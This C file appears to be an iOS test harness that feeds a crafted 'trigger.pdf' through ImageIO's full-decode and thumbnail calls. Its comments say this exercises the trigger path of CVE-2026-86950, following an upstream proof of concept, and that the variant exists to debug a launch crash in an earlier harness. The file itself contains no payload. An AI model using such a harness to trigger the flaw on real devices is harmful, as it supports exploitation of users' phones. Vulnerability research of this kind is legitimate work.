/*
 * cg_decode_pure.c - O-D (fourth sibling), the CGDEC startup-bug experiment.
 *
 * Why this exists: CGDEC (cg_decode.c) trapped 4/4 times on 2026-10-27 at ~22 ms,
 * EXC_BREAKPOINT / PAC data-auth failure inside object_getClass, called from
 * -[NSPathStore2 stringByAppendingPathComponent:] <- main:70. The payload decode
 * never started. CGDEC has never successfully run on device (the Oct 21 session
 * never got an install past the throttle), so this is a first-contact bug of the
 * arm64 ObjC path under DVT launch, not a regression.
 *
 * This variant is PURE C - zero ObjC dispatch, zero Foundation:
 *   - paths from getenv("CFFIXED_USER_HOME") / getenv("HOME"), snprintf-built
 *   - file existence via stat(), file copy via open/read/write
 *   - bundle dir from _NSGetExecutablePath (strip the executable name)
 *   - report via fopen/fprintf (same cg_report.txt protocol)
 * The decode calls are unchanged C APIs (CFURL / CGImageSource) - the actual
 * CVE-2026-86950 trigger path is identical.
 *
 * Read-out (decisive either way):
 *   - CGDECPURE survives startup, CGDEC traps  -> bug is the ObjC dispatch path
 *     under DVT launch; all harnesses go pure-C for path/report work.
 *   - CGDECPURE ALSO traps                      -> the problem is the launch
 *     environment itself (DVT/posix_spawn flags), not ObjC. Escalate to O-B.
 *
 * Build: $CC -O0 -g -o CGDECPURE cg_decode_pure.c
 *        -framework CoreGraphics -framework ImageIO -framework CoreFoundation
 *        (no Foundation, no -x objective-c)
 */

#include <CoreFoundation/CoreFoundation.h>
#include <CoreGraphics/CoreGraphics.h>
#include <ImageIO/ImageIO.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <mach-o/dyld.h>
#include <libgen.h>

static FILE *g_report = NULL;

static void report_open(void)
{
    const char *home = getenv("CFFIXED_USER_HOME");
    if (!home || !*home) home = getenv("HOME");
    if (!home || !*home) home = "/var/mobile";
    char dir[1024];
    snprintf(dir, sizeof(dir), "%s/Documents", home);
    mkdir(dir, 0755); /* exists is fine */
    char path[1280];
    snprintf(path, sizeof(path), "%s/cg_report.txt", dir);
    g_report = fopen(path, "a");
    if (g_report) {
        time_t t = time(NULL);
        fprintf(g_report, "=== cg_decode_pure run %s", ctime(&t)); /* ctime adds \n */
        fflush(g_report);
    }
}

static void rline(const char *s)
{
    if (!g_report) return;
    fprintf(g_report, "%s\n", s);
    fflush(g_report);
}

static void rlinef(const char *fmt, ...)
{
    va_list ap;
    char buf[1024];
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    rline(buf);
}

/* pure-C copy: src file -> dst file */
static int file_copy(const char *src, const char *dst)
{
    int in = open(src, O_RDONLY);
    if (in < 0) return -1;
    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0) { close(in); return -1; }
    char buf[8192];
    long n;
    while ((n = read(in, buf, sizeof(buf))) > 0)
        if (write(out, buf, n) != n) { close(in); close(out); return -1; }
    close(in); close(out);
    return 0;
}

int main(void)
{
    report_open();
    rline("pure-C harness alive (no objc dispatch yet)");

    const char *name = getenv("CG_FILE");
    if (!name || !*name) name = "trigger.pdf";

    /* documents path, pure C */
    const char *home = getenv("CFFIXED_USER_HOME");
    if (!home || !*home) home = getenv("HOME");
    if (!home || !*home) home = "/var/mobile";
    char docs[1024], path[1280], bpath[1280];
    snprintf(docs, sizeof(docs), "%s/Documents", home);
    mkdir(docs, 0755);
    snprintf(path, sizeof(path), "%s/%s", docs, name);

    /* bundle dir = dirname of the executable path */
    char exe[1024];
    uint32_t exe_sz = sizeof(exe);
    if (_NSGetExecutablePath(exe, &exe_sz) != 0) exe[0] = 0;
    char exe_copy[1024];
    snprintf(exe_copy, sizeof(exe_copy), "%s", exe);
    char *appdir = dirname(exe_copy); /* in-place, hence the copy */
    snprintf(bpath, sizeof(bpath), "%s/%s", appdir, name);

    struct stat st;
    if (stat(path, &st) != 0 && stat(bpath, &st) == 0) {
        if (file_copy(bpath, path) == 0)
            rline("  staged the file from the bundle into Documents");
        else
            rline("  bundle copy FAILED");
    }

    rlinef("decoding %s", path);
    rline("about to call CFURLCreateFromFileSystemRepresentation (first CF call)");

    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (const UInt8 *)path, (CFIndex)strlen(path), false);
    if (!url) { rline("FAIL CFURLCreate"); return 2; }
    CGImageSourceRef src = CGImageSourceCreateWithURL(url, NULL);
    CFRelease(url);
    if (!src) { rline("FAIL CGImageSourceCreateWithURL (ImageIO rejected the file)"); return 3; }
    rline("image source created");

    size_t n = CGImageSourceGetCount(src);
    rlinef("  frame count = %zu", n);

    /* 1. full decode - this is the one that allocates the real buffer */
    rline("  calling CGImageSourceCreateImageAtIndex (FULL decode) ...");
    CGImageRef img = CGImageSourceCreateImageAtIndex(src, 0, NULL);
    if (img) {
        rlinef("  SURVIVED full decode: img=%p %zux%zu",
               (void *)img, (size_t)CGImageGetWidth(img), (size_t)CGImageGetHeight(img));
        CGImageRelease(img);
    } else {
        rline("  full decode returned NULL (the decoder refused or failed)");
    }

    /* 2. thumbnail path (the upstream PoC's shape) */
    int sz = 256;
    CFStringRef k[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                        kCGImageSourceThumbnailMaxPixelSize };
    CFTypeRef   v[] = { kCFBooleanTrue, CFNumberCreate(NULL, kCFNumberIntType, &sz) };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)k, (const void **)v, 2,
                                              &kCFTypeDictionaryKeyCallBacks,
                                              &kCFTypeDictionaryValueCallBacks);
    rline("  calling CGImageSourceCreateThumbnailAtIndex (thumbnail path) ...");
    CGImageRef timg = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
    if (timg) {
        rlinef("  SURVIVED thumbnail: img=%p %zux%zu",
               (void *)timg, (size_t)CGImageGetWidth(timg), (size_t)CGImageGetHeight(timg));
        CGImageRelease(timg);
    } else {
        rline("  thumbnail returned NULL");
    }

    CFRelease(src);
    rline("cg_decode_pure DONE - reached the end alive");
    if (g_report) { fflush(g_report); fclose(g_report); g_report = NULL; }
    return 0;
}
